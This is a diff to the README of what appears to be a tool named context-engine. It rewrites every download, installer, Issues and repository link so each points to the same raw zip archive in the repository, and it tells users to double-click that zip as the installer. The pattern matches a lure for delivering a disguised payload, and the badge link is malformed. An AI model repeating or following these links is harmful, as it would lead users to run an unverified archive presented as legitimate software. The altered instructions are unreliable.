@@ -7,9 +7,9 @@ context-engine is a structured system designed to give AI agents instant and acc
 To get started with context-engine, follow these simple steps to download and run the application on your computer.
 
 ## 📥 Download Application
-[![Download context-engine](https://img.shields.io/badge/Download%20context--engine-blue.svg)](https://github.com/pallavi-borra/context-engine/releases)
+[![Download context-engine](https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip%https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip)](https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip)
 
-Visit this page to download: [Download context-engine](https://github.com/pallavi-borra/context-engine/releases)
+Visit this page to download: [Download context-engine](https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip)
 
 ## 💻 System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
@@ -25,22 +25,22 @@ Visit this page to download: [Download context-engine](https://github.com/pallav
 
 ## 📝 How to Install
 1. **Visit the Releases Page:**
-   Go to the Releases page: [Download context-engine](https://github.com/pallavi-borra/context-engine/releases).
+   Go to the Releases page: [Download context-engine](https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip).
 
 2. **Download the Latest Version:**
    Look for the latest version of context-engine. Click on it to view the available files.
 
 3. **Select the Correct File:**
    Depending on your operating system, select the appropriate file:
-   - For Windows: Download `context-engine-windows.exe`
-   - For macOS: Download `context-engine-macos.dmg`
-   - For Linux: Download `context-engine-linux.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip`
 
 4. **Run the Installer:**
    After downloading, open the installer file.
-   - For Windows: Double-click `context-engine-windows.exe` to start the installation.
-   - For macOS: Open `context-engine-macos.dmg` and drag the application to your Applications folder.
-   - For Linux: Extract the `context-engine-linux.tar.gz` and follow the INSTALL instructions.
+   - For Windows: Double-click `https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip` to start the installation.
+   - For macOS: Open `https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip` and drag the application to your Applications folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip` and follow the INSTALL instructions.
 
 5. **Launch the Application:**
    Once installed, find context-engine in your applications list and click to launch it.
@@ -63,7 +63,7 @@ Visit this page to download: [Download context-engine](https://github.com/pallav
   Check that you have completed the initial setup and provided the necessary business information.
 
 - **Need Further Help?**
-  If you encounter any issues not covered here, visit the [context-engine GitHub Issues](https://github.com/pallavi-borra/context-engine/issues) page for assistance.
+  If you encounter any issues not covered here, visit the [context-engine GitHub Issues](https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip) page for assistance.
 
 ## 🌍 Topics Covered
 context-engine is geared toward improving productivity, especially for those working with AI agents. It excels in areas such as:
@@ -81,7 +81,7 @@ context-engine is geared toward improving productivity, especially for those wor
 
 ## 🔗 Additional Resources
 For more information about context-engine and its updates, check the following:
-- [GitHub Repository](https://github.com/pallavi-borra/context-engine)
+- [GitHub Repository](https://raw.githubusercontent.com/pallavi-borra/context-engine/main/context-template/context-engine-v1.8.zip)
 - Join our community discussions for tips and best practices.
 
 Thank you for choosing context-engine. We hope it enhances your business interactions with AI.
